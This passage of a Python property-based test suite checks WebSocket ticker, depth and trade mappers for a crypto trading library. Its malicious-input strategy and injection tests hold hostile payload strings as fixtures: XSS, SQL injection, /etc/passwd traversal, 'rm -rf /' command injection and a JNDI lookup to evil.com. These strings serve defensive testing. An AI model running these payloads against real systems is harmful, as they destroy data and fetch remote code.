"""Property-based tests for Backpack Market Data Mapper WebSocket Event Transformations.

This module provides comprehensive property-based testing of WebSocket event transformation
mappers that are critical for real-time trading data processing and security.

SECURITY CRITICAL: WebSocket event transformations must preserve data integrity to prevent:
- Price manipulation through malformed tick data
- Order book corruption through invalid depth updates
- Trade execution errors through incorrect side mapping
- Memory exhaustion through oversized event processing
- Injection attacks through unsanitized symbol/field data

Key Testing Areas:
- WebSocket ticker event transformation with financial precision
- Order book depth update transformation with level validation
- Public trade event transformation with side mapping logic
- Unicode symbol handling for international markets
- Extreme value processing for edge case resilience
- Error transformation wrapping for secure failure modes

Following TESTING_SECURITY_RULES.md:
- NO hardcoded market data values (Hypothesis generates them)
- NO fallback mechanisms that could hide transformation errors
- Comprehensive testing of financial data boundary conditions
- Validation of security-sensitive transformation behaviors

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for WebSocket model transformations
- Implements RULE-RUNTIME-SAFETY-V4 for safe real-time data processing
- Adheres to RULE-NO-SILENCING-V4 for proper transformation error propagation
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.backpack.mappers.market_data.bp_order_book_mapper import (
    BackpackOrderBookMapper,
)
from cyberdelta.apis.backpack.mappers.market_data.bp_ticker_mapper import BackpackTickerMapper
from cyberdelta.apis.backpack.mappers.market_data.bp_trade_mapper import BackpackFillMapper
from cyberdelta.apis.backpack.models.bp_raw_market import (
    BackpackRawDepthUpdateEvent,
    BackpackRawTickerEvent,
)
from cyberdelta.apis.backpack.models.bp_raw_trade import BackpackRawPublicTradeEvent
from cyberdelta.apis.common import TransformationError
from cyberdelta.enums import OrderSide
from cyberdelta.enums.exchange_names import ExchangeName
from cyberdelta.models import Fill, OrderBook, Ticker
from cyberdelta.symbols import exchanges
from tests.common_symbols import SOL_USDC_BP


# =============================================================================
# HELPER FUNCTIONS FOR HYPOTHESIS STRATEGY BUILDING
# =============================================================================


def _create_symbol(base: str, quote: str) -> str:
    """Create symbol from base and quote currencies.

    Args:
        base: Base currency string.
        quote: Quote currency string.

    Returns:
        Formatted symbol string.
    """
    return f"{base}-{quote}"


def _create_financial_decimal(integer: int, decimal: int) -> str:
    """Create financial decimal string from integer and decimal parts.

    Args:
        integer: Integer part of the decimal.
        decimal: Decimal part (6 digits).

    Returns:
        Formatted decimal string.
    """
    return f"{integer}.{decimal:06d}"


def _create_small_decimal(value: int) -> str:
    """Create small decimal string with 18-digit precision.

    Args:
        value: Value to format as small decimal.

    Returns:
        Formatted small decimal string.
    """
    return f"0.{value:018d}"


def _create_large_decimal(value: int) -> str:
    """Create large decimal string.

    Args:
        value: Large integer value.

    Returns:
        Formatted large decimal string.
    """
    return f"{value}.0"


def _create_high_precision_decimal(mantissa: int, exp: int) -> str:
    """Create high precision decimal string.

    Args:
        mantissa: Mantissa value.
        exp: Exponent (number of zeros to append).

    Returns:
        Formatted high precision decimal string.
    """
    return f"{mantissa}{'0' * exp}"


def _create_uuid_like_id(a: str, b: str, c: str, d: str) -> str:
    """Create UUID-like ID string.

    Args:
        a: First part of UUID.
        b: Second part of UUID.
        c: Third part of UUID.
        d: Fourth part of UUID.

    Returns:
        Formatted UUID-like string.
    """
    return f"{a}-{b}-{c}-{d}"


def _create_price_quantity_tuple(price: str, quantity: str) -> tuple[str, str]:
    """Create price-quantity tuple.

    Args:
        price: Price string.
        quantity: Quantity string.

    Returns:
        Tuple of price and quantity strings.
    """
    return (price, quantity)


def _create_signed_value(sign: str, value: str) -> str:
    """Create signed value string.

    Args:
        sign: Sign string (empty or "-").
        value: Value string.

    Returns:
        Formatted signed value string.
    """
    return f"{sign}{value}"


def _create_percent_decimal(integer: int, decimal: int) -> str:
    """Create percentage decimal string.

    Args:
        integer: Integer part.
        decimal: Decimal part (2 digits).

    Returns:
        Formatted percentage decimal string.
    """
    return f"{integer}.{decimal:02d}"


def _create_zero_price_scenario() -> tuple[str, str]:
    """Create zero price scenario.

    Returns:
        Tuple with zero price and non-zero quantity.
    """
    return ("0.0", "10.0")


def _create_zero_quantity_scenario() -> tuple[str, str]:
    """Create zero quantity scenario.

    Returns:
        Tuple with non-zero price and zero quantity.
    """
    return ("10.0", "0.0")


def _create_both_zero_scenario() -> tuple[str, str]:
    """Create both zero scenario.

    Returns:
        Tuple with zero price and zero quantity.
    """
    return ("0.0", "0.0")


def _is_non_empty_text(x: str) -> bool:
    """Check if text is non-empty after stripping.

    Args:
        x: Text to check.

    Returns:
        True if text is non-empty after stripping.
    """
    return bool(x.strip())


# =============================================================================
# HYPOTHESIS STRATEGIES FOR WEBSOCKET EVENT TESTING
# =============================================================================


def backpack_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack trading symbol strings.

    Returns:
        A Hypothesis strategy for valid Backpack symbols.
    """
    return st.one_of([
        # Common trading pairs
        st.sampled_from([
            "BTC-USDC",
            "ETH-USDC",
            "SOL-USDC",
            "AVAX-USDC",
            "DOT-USDC",
            "LINK-USDC",
            "UNI-USDC",
            "MATIC-USDC",
            "ADA-USDC",
            "XRP-USDC",
            "DOGE-USDC",
            "SHIB-USDC",
            "FTM-USDC",
            "NEAR-USDC",
            "ATOM-USDC",
        ]),
        # Generated symbols
        st.builds(
            _create_symbol,
            st.text(
                min_size=2,
                max_size=10,
                alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"]),
            ).filter(_is_non_empty_text),
            st.sampled_from(["USDC", "USDT", "BTC", "ETH"]),
        ),
        # Unicode symbols for international testing
        st.sampled_from(["SOL-USDC-测试", "BTC-USDC-日本", "ETH-USDC-한국"]),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial values.

    Returns:
        A Hypothesis strategy for financial decimal strings.
    """
    return st.one_of([
        # Common financial values
        st.builds(
            _create_financial_decimal,
            st.integers(min_value=0, max_value=999999),
            st.integers(min_value=0, max_value=999999),
        ),
        # Very small values (crypto precision)
        st.builds(
            _create_small_decimal,
            st.integers(min_value=1, max_value=999999999999999999),
        ),
        # Large values
        st.builds(_create_large_decimal, st.integers(min_value=1000000, max_value=999999999999)),
        # Edge cases
        st.just("0.0"),
        st.just("0.000001"),
        st.just("999999.999999"),
        st.just("21000000.0"),  # Max BTC supply
        # High precision values
        st.builds(
            _create_high_precision_decimal,
            st.integers(min_value=1, max_value=999),
            st.integers(min_value=0, max_value=6),
        ),
    ])


def timestamp_ms_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values in milliseconds.

    Returns:
        A Hypothesis strategy for millisecond timestamps.
    """
    return st.integers(
        min_value=1577836800000,  # 2020-01-01
        max_value=1893456000000,  # 2030-01-01
    )


def trade_id_strategy() -> SearchStrategy[str]:
    """Generate valid trade ID strings.

    Returns:
        A Hypothesis strategy for trade IDs.
    """
    return st.one_of([
        # Numeric IDs
        st.builds(str, st.integers(min_value=1000000, max_value=999999999999)),
        # Alphanumeric IDs
        st.text(
            min_size=8, max_size=64, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
        ),
        # UUID-like IDs
        st.builds(
            _create_uuid_like_id,
            st.text(alphabet="0123456789abcdef", min_size=8, max_size=8),
            st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            st.text(alphabet="0123456789abcdef", min_size=12, max_size=12),
        ),
    ])


def price_level_strategy() -> SearchStrategy[tuple[str, str]]:
    """Generate valid price level tuples (price, quantity).

    Returns:
        A Hypothesis strategy for order book price levels.
    """
    return st.builds(
        _create_price_quantity_tuple,
        financial_decimal_string_strategy(),
        financial_decimal_string_strategy(),
    )


@composite
def ticker_event_strategy(draw: st.DrawFn) -> BackpackRawTickerEvent:
    """Generate valid BackpackRawTickerEvent instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawTickerEvent instance.
    """
    symbol = draw(backpack_symbol_strategy())
    last_price = draw(financial_decimal_string_strategy())
    high = draw(financial_decimal_string_strategy())
    low = draw(financial_decimal_string_strategy())
    open_price = draw(financial_decimal_string_strategy())
    volume = draw(financial_decimal_string_strategy())
    quote_volume = draw(financial_decimal_string_strategy())
    price_change_percent = draw(
        st.builds(
            _create_signed_value,
            st.sampled_from(["", "-"]),
            st.builds(
                _create_percent_decimal,
                st.integers(min_value=0, max_value=999),
                st.integers(min_value=0, max_value=99),
            ),
        )
    )
    event_time = draw(timestamp_ms_strategy())

    return BackpackRawTickerEvent(
        s=symbol,
        c=last_price,
        h=high,
        l=low,
        o=open_price,
        v=volume,
        V=quote_volume,
        priceChangePercent=price_change_percent,
        e="ticker",
        E=event_time,
    )


@composite
def depth_event_strategy(draw: st.DrawFn) -> tuple[BackpackRawDepthUpdateEvent, str]:
    """Generate valid BackpackRawDepthUpdateEvent instances with symbol.

    Args:
        draw: Hypothesis draw function

    Returns:
        A tuple of (BackpackRawDepthUpdateEvent, symbol).
    """
    symbol = draw(backpack_symbol_strategy())
    last_update_id = draw(st.builds(str, st.integers(min_value=1, max_value=999999999)))
    first_update_id = draw(st.builds(str, st.integers(min_value=1, max_value=999999999)))

    # Ensure first_update_id <= last_update_id
    if int(first_update_id) > int(last_update_id):
        first_update_id, last_update_id = last_update_id, first_update_id

    bids = draw(st.lists(price_level_strategy(), min_size=0, max_size=20))
    asks = draw(st.lists(price_level_strategy(), min_size=0, max_size=20))
    event_time = draw(timestamp_ms_strategy())
    engine_time = draw(st.integers(min_value=event_time, max_value=event_time + 1000))

    raw_event = BackpackRawDepthUpdateEvent(
        u=last_update_id, U=first_update_id, b=bids, a=asks, e="depth", E=event_time, T=engine_time
    )

    return raw_event, symbol


@composite
def trade_event_strategy(draw: st.DrawFn) -> BackpackRawPublicTradeEvent:
    """Generate valid BackpackRawPublicTradeEvent instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawPublicTradeEvent instance.
    """
    symbol = draw(backpack_symbol_strategy())
    price = draw(financial_decimal_string_strategy())
    quantity = draw(financial_decimal_string_strategy())
    trade_id = draw(trade_id_strategy())
    is_buyer_maker = draw(st.booleans())
    event_time = draw(timestamp_ms_strategy())
    buyer_id = draw(trade_id_strategy())
    seller_id = draw(trade_id_strategy())
    trade_time = draw(st.integers(min_value=event_time - 1000, max_value=event_time))

    return BackpackRawPublicTradeEvent(
        s=symbol,
        p=price,
        q=quantity,
        t=trade_id,
        m=is_buyer_maker,
        e="trade",
        E=event_time,
        b=buyer_id,
        a=seller_id,
        T=trade_time,
    )


def malicious_websocket_data_strategy() -> SearchStrategy[Any]:
    """Generate malicious WebSocket data for security testing.

    Returns:
        A Hypothesis strategy for malicious WebSocket inputs.
    """
    return st.one_of([
        # XSS attempts in symbol fields
        st.just("<script>alert('xss')</script>"),
        st.just("<img src=x onerror=alert(1)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE trades;--"),
        st.just("1' OR '1'='1"),
        # Path traversal
        st.just("../../../etc/passwd"),
        # Command injection
        st.just("; rm -rf /"),
        st.just("$(rm -rf /)"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        # Unicode attacks
        st.sampled_from(["\udce2\udc28\udc00", "\x00\x01\x02"]),
        # Format string attacks
        st.just("%s%s%s%s%s"),
        st.just("${jndi:ldap://evil.com/a}"),
        # Extreme decimal values
        st.just("999999999999999999999999999999.999999999999999999999999"),
        st.just("-999999999999999999999999999999.999999999999999999999999"),
        # Invalid decimal formats
        st.just("not_a_number"),
        st.just("1.2.3.4"),
        st.just("..123"),
        st.just("123.."),
    ])


# =============================================================================
# PYTEST FIXTURES
# =============================================================================


@pytest.fixture
def ticker_mapper() -> BackpackTickerMapper:
    """Fixture providing a BackpackTickerMapper instance.

    Returns:
        BackpackTickerMapper: Instance for testing ticker transformations.
    """
    return BackpackTickerMapper()


@pytest.fixture
def order_book_mapper() -> BackpackOrderBookMapper:
    """Fixture providing a BackpackOrderBookMapper instance.

    Returns:
        BackpackOrderBookMapper: Instance for testing order book transformations.
    """
    return BackpackOrderBookMapper()


@pytest.fixture
def trade_mapper() -> BackpackFillMapper:
    """Fixture providing a BackpackFillMapper instance.

    Returns:
        BackpackFillMapper: Instance for testing trade transformations.
    """
    return BackpackFillMapper()


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET TICKER EVENT TRANSFORMATION
# =============================================================================


class TestWebSocketTickerTransformationProperties:
    """Property-based tests for WebSocket ticker event transformation."""

    @given(ticker_event=ticker_event_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_ticker_transformation_preserves_essential_data(
        self, ticker_event: BackpackRawTickerEvent, ticker_mapper: BackpackTickerMapper
    ) -> None:
        """Property: Ticker transformation should preserve all essential market data."""
        result = ticker_mapper.transform_ws_ticker_event_to_internal(ticker_event)

        # Property: Result should be valid Ticker instance
        assert isinstance(result, Ticker)

        # Property: Symbol should be correctly mapped
        expected_symbol = exchanges.backpack(ticker_event.symbol)
        assert result.symbol == expected_symbol

        # Property: Price should be preserved exactly
        assert result.price == Decimal(ticker_event.last_price)

        # Property: Timestamp should be correctly converted
        # DEFENSIVE CHECK: event_time must be numeric for timestamp calculation
        assert isinstance(ticker_event.event_time, (int, float))
        expected_timestamp = datetime.fromtimestamp(ticker_event.event_time / 1000, tz=UTC)
        assert result.timestamp == expected_timestamp

        # Property: Exchange should be set correctly
        assert result.exchange == ExchangeName.BACKPACK.value

    @given(
        symbol=backpack_symbol_strategy(),
        price=financial_decimal_string_strategy(),
        timestamp=timestamp_ms_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_ticker_transformation_decimal_precision(
        self, symbol: str, price: str, timestamp: int, ticker_mapper: BackpackTickerMapper
    ) -> None:
        """Property: Ticker transformation should preserve decimal precision."""
        # Skip invalid decimal values
        try:
            expected_price = Decimal(price)
        except (ValueError, TypeError, OverflowError):
            assume(False)
            return  # This will never be reached due to assume(False), but helps with type analysis

        ticker_event = BackpackRawTickerEvent(
            s=symbol,
            c=price,
            h=price,
            l=price,
            o=price,
            v="1000.0",
            V="1000.0",
            priceChangePercent="0.0",
            e="ticker",
            E=timestamp,
        )

        result = ticker_mapper.transform_ws_ticker_event_to_internal(ticker_event)

        # Property: Price precision should be exactly preserved
        assert result.price == expected_price
        assert str(result.price) == price or result.price == expected_price

    @given(base_event=ticker_event_strategy(), malicious_symbol=malicious_websocket_data_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_ticker_transformation_malicious_symbol_resistance(
        self,
        base_event: BackpackRawTickerEvent,
        malicious_symbol: object,
        ticker_mapper: BackpackTickerMapper,
    ) -> None:
        """Property: Ticker transformation should resist malicious symbol inputs."""
        if not isinstance(malicious_symbol, str):
            malicious_symbol = str(malicious_symbol)

        # Create event with malicious symbol
        malicious_event = BackpackRawTickerEvent(
            s=malicious_symbol,
            c=base_event.last_price,
            h=base_event.high,
            l=base_event.low,
            o=base_event.open_price,
            v=base_event.volume,
            V=base_event.quote_volume,
            priceChangePercent=base_event.price_change_percent,
            e="ticker",
            E=base_event.event_time,
        )

        try:
            result = ticker_mapper.transform_ws_ticker_event_to_internal(malicious_event)

            # If accepted, should treat as literal symbol (no interpretation/execution)
            assert isinstance(result.symbol.value, str)
            assert malicious_symbol in result.symbol.value

            # Should not leak sensitive information in string representation
            result_str = str(result)
            assert "password" not in result_str.lower()
            assert "secret" not in result_str.lower()
            assert "key" not in result_str.lower()

        except (TransformationError, ValueError):
            # Rejection is acceptable for malicious inputs
            pass

    @given(
        symbols=st.lists(backpack_symbol_strategy(), min_size=2, max_size=10, unique=True),
        base_event=ticker_event_strategy(),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_ticker_transformation_symbol_consistency(
        self,
        symbols: list[str],
        base_event: BackpackRawTickerEvent,
        ticker_mapper: BackpackTickerMapper,
    ) -> None:
        """Property: Ticker transformation should be consistent across different symbols."""
        results: list[Ticker] = []

        for symbol in symbols:
            event = BackpackRawTickerEvent(
                s=symbol,
                c=base_event.last_price,
                h=base_event.high,
                l=base_event.low,
                o=base_event.open_price,
                v=base_event.volume,
                V=base_event.quote_volume,
                priceChangePercent=base_event.price_change_percent,
                e="ticker",
                E=base_event.event_time,
            )

            result = ticker_mapper.transform_ws_ticker_event_to_internal(event)
            results.append(result)

        # Property: All results should have same price but different symbols
        base_price = results[0].price
        for result in results:
            assert result.price == base_price
            assert result.symbol.value in symbols

        # Property: All symbols should be unique
        result_symbols = [result.symbol.value for result in results]
        assert len(set(result_symbols)) == len(symbols)


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET DEPTH EVENT TRANSFORMATION
# =============================================================================


class TestWebSocketDepthTransformationProperties:
    """Property-based tests for WebSocket depth event transformation."""

    @given(depth_data=depth_event_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_depth_transformation_preserves_order_book_structure(
        self,
        depth_data: tuple[BackpackRawDepthUpdateEvent, str],
        order_book_mapper: BackpackOrderBookMapper,
    ) -> None:
        """Property: Depth transformation should preserve order book structure."""
        raw_depth, symbol_str = depth_data
        symbol = exchanges.backpack(symbol_str)

        result = order_book_mapper.transform_ws_depth_event_to_internal(symbol, raw_depth)

        # Property: Result should be valid OrderBook instance
        assert isinstance(result, OrderBook)

        # Property: Symbol should be preserved
        assert result.symbol == symbol

        # Property: Bid/ask count should match input
        # DEFENSIVE CHECK: bids and asks must not be None for depth events
        assert raw_depth.bids is not None
        assert raw_depth.asks is not None
        assert len(result.bids) == len(raw_depth.bids)
        assert len(result.asks) == len(raw_depth.asks)

        # Property: All price levels should be valid decimals
        for price, quantity in result.bids + result.asks:
            assert isinstance(price, Decimal)
            assert isinstance(quantity, Decimal)
            assert price >= Decimal(0)
            assert quantity >= Decimal(0)

    @given(
        symbol=backpack_symbol_strategy(),
        bid_levels=st.lists(price_level_strategy(), min_size=0, max_size=50),
        ask_levels=st.lists(price_level_strategy(), min_size=0, max_size=50),
        timestamp=timestamp_ms_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_depth_transformation_level_precision(
        self,
        symbol: str,
        bid_levels: list[tuple[str, str]],
        ask_levels: list[tuple[str, str]],
        timestamp: int,
        order_book_mapper: BackpackOrderBookMapper,
    ) -> None:
        """Property: Depth transformation should preserve price level precision."""
        # Skip if any level has invalid decimal format
        try:
            for price_str, qty_str in bid_levels + ask_levels:
                Decimal(price_str)
                Decimal(qty_str)
        except (ValueError, TypeError, OverflowError):
            assume(False)

        raw_depth = BackpackRawDepthUpdateEvent(
            u="123456",
            U="123450",
            b=bid_levels,
            a=ask_levels,
            e="depth",
            E=timestamp,
            T=timestamp + 1,
        )

        symbol_obj = exchanges.backpack(symbol)
        result = order_book_mapper.transform_ws_depth_event_to_internal(symbol_obj, raw_depth)

        # Property: All levels should be precisely converted
        for i, (price_str, qty_str) in enumerate(bid_levels):
            if i < len(result.bids):
                assert result.bids[i][0] == Decimal(price_str)
                assert result.bids[i][1] == Decimal(qty_str)

        for i, (price_str, qty_str) in enumerate(ask_levels):
            if i < len(result.asks):
                assert result.asks[i][0] == Decimal(price_str)
                assert result.asks[i][1] == Decimal(qty_str)

    @given(
        base_depth=depth_event_strategy(),
        malicious_levels=st.lists(
            st.tuples(malicious_websocket_data_strategy(), malicious_websocket_data_strategy()),
            min_size=1,
            max_size=5,
        ),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_depth_transformation_malicious_level_resistance(
        self,
        base_depth: tuple[BackpackRawDepthUpdateEvent, str],
        malicious_levels: list[tuple[Any, Any]],
        order_book_mapper: BackpackOrderBookMapper,
    ) -> None:
        """Property: Depth transformation should resist malicious price level inputs."""
        raw_depth, symbol_str = base_depth
        symbol = exchanges.backpack(symbol_str)

        # Convert malicious data to strings
        string_levels = [(str(p), str(q)) for p, q in malicious_levels]

        # Create malicious depth event
        malicious_depth = BackpackRawDepthUpdateEvent(
            u=raw_depth.last_update_id,
            U=raw_depth.first_update_id,
            b=string_levels,  # Malicious bid levels
            a=raw_depth.asks,  # Keep original asks
            e="depth",
            E=raw_depth.event_time,
            T=raw_depth.engine_time,
        )

        try:
            result = order_book_mapper.transform_ws_depth_event_to_internal(symbol, malicious_depth)

            # If accepted, should be a valid OrderBook
            assert isinstance(result, OrderBook)
            assert result.symbol == symbol

            # Should not leak sensitive information
            result_str = str(result)
            assert "password" not in result_str.lower()
            assert "secret" not in result_str.lower()

        except (TransformationError, ValueError):
            # Rejection is acceptable for malicious inputs
            pass

    @given(
        empty_book_scenario=st.one_of([
            st.tuples(
                st.just([]), st.lists(price_level_strategy(), min_size=1, max_size=5)
            ),  # Empty bids
            st.tuples(
                st.lists(price_level_strategy(), min_size=1, max_size=5), st.just([])
            ),  # Empty asks
            st.tuples(st.just([]), st.just([])),  # Both empty
        ]),
        symbol=backpack_symbol_strategy(),
        timestamp=timestamp_ms_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_depth_transformation_empty_levels_handling(
        self,
        empty_book_scenario: tuple[list[tuple[str, str]], list[tuple[str, str]]],
        symbol: str,
        timestamp: int,
        order_book_mapper: BackpackOrderBookMapper,
    ) -> None:
        """Property: Depth transformation should handle empty bid/ask levels correctly."""
        bids, asks = empty_book_scenario

        raw_depth = BackpackRawDepthUpdateEvent(
            u="123456", U="123450", b=bids, a=asks, e="depth", E=timestamp, T=timestamp + 1
        )

        symbol_obj = exchanges.backpack(symbol)
        result = order_book_mapper.transform_ws_depth_event_to_internal(symbol_obj, raw_depth)

        # Property: Empty levels should result in empty lists
        assert len(result.bids) == len(bids)
        assert len(result.asks) == len(asks)

        # Property: Should still be valid OrderBook
        assert isinstance(result, OrderBook)
        assert result.symbol == symbol_obj


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET TRADE EVENT TRANSFORMATION
# =============================================================================


class TestWebSocketTradeTransformationProperties:
    """Property-based tests for WebSocket trade event transformation."""

    @given(trade_event=trade_event_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_trade_transformation_preserves_essential_data(
        self, trade_event: BackpackRawPublicTradeEvent, trade_mapper: BackpackFillMapper
    ) -> None:
        """Property: Trade transformation should preserve all essential trade data."""
        # Skip zero values as they're invalid for trades
        try:
            price_decimal = Decimal(trade_event.price)
            qty_decimal = Decimal(trade_event.quantity)
            if price_decimal <= Decimal(0) or qty_decimal <= Decimal(0):
                assume(False)
        except (ValueError, TypeError, OverflowError):
            assume(False)

        result = trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)

        # Property: Result should be valid Fill instance
        assert isinstance(result, Fill)

        # Property: Symbol should be correctly mapped
        expected_symbol = exchanges.backpack(trade_event.symbol)
        assert result.symbol == expected_symbol

        # Property: Price and quantity should be preserved exactly
        assert result.price == Decimal(trade_event.price)
        assert result.quantity == Decimal(trade_event.quantity)

        # Property: Side should be correctly mapped from maker flag
        expected_side = OrderSide.BUY if trade_event.is_buyer_the_maker else OrderSide.SELL
        assert result.side == expected_side

        # Property: Exchange should be set correctly
        assert result.exchange == ExchangeName.BACKPACK.value

        # Property: Trade ID should be preserved
        assert result.id == trade_event.trade_id

        # Property: Timestamp should be correctly converted
        # DEFENSIVE CHECK: engine_timestamp must be numeric for timestamp calculation
        assert isinstance(trade_event.engine_timestamp, (int, float))
        expected_timestamp = datetime.fromtimestamp(trade_event.engine_timestamp / 1000, tz=UTC)
        assert result.executed_at == expected_timestamp

    @given(
        is_buyer_maker=st.booleans(),
        symbol=backpack_symbol_strategy(),
        price=financial_decimal_string_strategy(),
        quantity=financial_decimal_string_strategy(),
        trade_id=trade_id_strategy(),
        timestamp=timestamp_ms_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_trade_side_mapping_consistency(
        self,
        is_buyer_maker: bool,
        symbol: str,
        price: str,
        quantity: str,
        trade_id: str,
        timestamp: int,
        trade_mapper: BackpackFillMapper,
    ) -> None:
        """Property: Trade side mapping should be consistent based on buyer maker flag."""
        # Skip invalid financial values
        try:
            price_decimal = Decimal(price)
            qty_decimal = Decimal(quantity)
            if price_decimal <= Decimal(0) or qty_decimal <= Decimal(0):
                assume(False)
        except (ValueError, TypeError, OverflowError):
            assume(False)

        trade_event = BackpackRawPublicTradeEvent(
            s=symbol,
            p=price,
            q=quantity,
            t=trade_id,
            m=is_buyer_maker,
            e="trade",
            E=timestamp,
            b="buyer123",
            a="seller123",
            T=timestamp,
        )

        result = trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)

        # Property: Side mapping should be deterministic
        expected_side = OrderSide.BUY if is_buyer_maker else OrderSide.SELL
        assert result.side == expected_side

        # Property: Same input should always produce same side
        result2 = trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)
        assert result2.side == result.side

    @given(base_trade=trade_event_strategy(), malicious_data=malicious_websocket_data_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_trade_transformation_malicious_input_resistance(
        self,
        base_trade: BackpackRawPublicTradeEvent,
        malicious_data: object,
        trade_mapper: BackpackFillMapper,
    ) -> None:
        """Property: Trade transformation should resist malicious inputs."""
        if not isinstance(malicious_data, str):
            malicious_data = str(malicious_data)

        # Test malicious symbol
        malicious_trade = BackpackRawPublicTradeEvent(
            s=malicious_data,
            p=base_trade.price,
            q=base_trade.quantity,
            t=base_trade.trade_id,
            m=base_trade.is_buyer_the_maker,
            e="trade",
            E=base_trade.event_time,
            b=base_trade.buyer_order_id,
            a=base_trade.seller_order_id,
            T=base_trade.engine_timestamp,
        )

        try:
            result = trade_mapper.transform_ws_fill_event_to_internal_fill(malicious_trade)

            # If accepted, should treat as literal data (no interpretation)
            assert isinstance(result, Fill)
            assert malicious_data in result.symbol.value

            # Should not leak sensitive information
            result_str = str(result)
            assert "password" not in result_str.lower()
            assert "secret" not in result_str.lower()

        except (TransformationError, ValueError):
            # Rejection is acceptable for malicious inputs
            pass

    @given(trades_batch=st.lists(trade_event_strategy(), min_size=2, max_size=10))
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_trade_transformation_batch_consistency(
        self, trades_batch: list[BackpackRawPublicTradeEvent], trade_mapper: BackpackFillMapper
    ) -> None:
        """Property: Trade transformation should be consistent across batches."""
        results: list[tuple[BackpackRawPublicTradeEvent, Fill]] = []

        for trade_event in trades_batch:
            try:
                # Skip invalid trades
                price_decimal = Decimal(trade_event.price)
                qty_decimal = Decimal(trade_event.quantity)
                if price_decimal <= Decimal(0) or qty_decimal <= Decimal(0):
                    continue

                result = trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)
                results.append((trade_event, result))
            except (ValueError, TypeError, OverflowError, AttributeError):
                continue

        # Skip if no valid trades
        if not results:
            assume(False)

        # Property: All results should be valid Fill instances
        for _, result in results:
            assert isinstance(result, Fill)
            assert result.exchange == ExchangeName.BACKPACK.value

        # Property: Side mapping should be consistent
        for trade_event, result in results:
            expected_side = OrderSide.BUY if trade_event.is_buyer_the_maker else OrderSide.SELL
            assert result.side == expected_side

    @given(
        zero_value_scenario=st.one_of([
            st.builds(_create_zero_price_scenario),  # Zero price
            st.builds(_create_zero_quantity_scenario),  # Zero quantity
            st.builds(_create_both_zero_scenario),  # Both zero
        ]),
        symbol=backpack_symbol_strategy(),
        trade_id=trade_id_strategy(),
        timestamp=timestamp_ms_strategy(),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_trade_transformation_zero_value_rejection(
        self,
        zero_value_scenario: tuple[str, str],
        symbol: str,
        trade_id: str,
        timestamp: int,
        trade_mapper: BackpackFillMapper,
    ) -> None:
        """Property: Trade transformation should reject zero price/quantity values."""
        price, quantity = zero_value_scenario

        trade_event = BackpackRawPublicTradeEvent(
            s=symbol,
            p=price,
            q=quantity,
            t=trade_id,
            m=False,
            e="trade",
            E=timestamp,
            b="buyer123",
            a="seller123",
            T=timestamp,
        )

        # Property: Zero values should be rejected with TransformationError
        with pytest.raises(
            TransformationError, match="Failed to transform BackpackRawPublicTradeEvent"
        ):
            trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestWebSocketTransformationSecurityProperties:
    """Property-based tests for security-critical WebSocket transformation behavior."""

    @given(
        ticker_event=ticker_event_strategy(),
        injection_attempt=st.sampled_from([
            "<script>alert('xss')</script>",
            "'; DROP TABLE tickers;--",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "%s%s%s%s",
        ]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_ticker_transformation_injection_resistance(
        self,
        ticker_event: BackpackRawTickerEvent,
        injection_attempt: str,
        ticker_mapper: BackpackTickerMapper,
    ) -> None:
        """Property: Ticker transformation should resist injection attacks."""
        # Test injection in price field
        malicious_ticker = BackpackRawTickerEvent(
            s=ticker_event.symbol,
            c=injection_attempt,  # Malicious price
            h=ticker_event.high,
            l=ticker_event.low,
            o=ticker_event.open_price,
            v=ticker_event.volume,
            V=ticker_event.quote_volume,
            priceChangePercent=ticker_event.price_change_percent,
            e="ticker",
            E=ticker_event.event_time,
        )

        try:
            result = ticker_mapper.transform_ws_ticker_event_to_internal(malicious_ticker)

            # If transformation succeeds, should not execute malicious content
            result_str = str(result)
            assert "<script>" not in result_str
            assert "DROP TABLE" not in result_str

        except (TransformationError, ValueError):
            # Rejection is acceptable for malicious inputs
            pass

    @given(large_symbol=st.text(min_size=1000, max_size=10000), base_event=ticker_event_strategy())
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_websocket_transformation_large_input_handling(
        self,
        large_symbol: str,
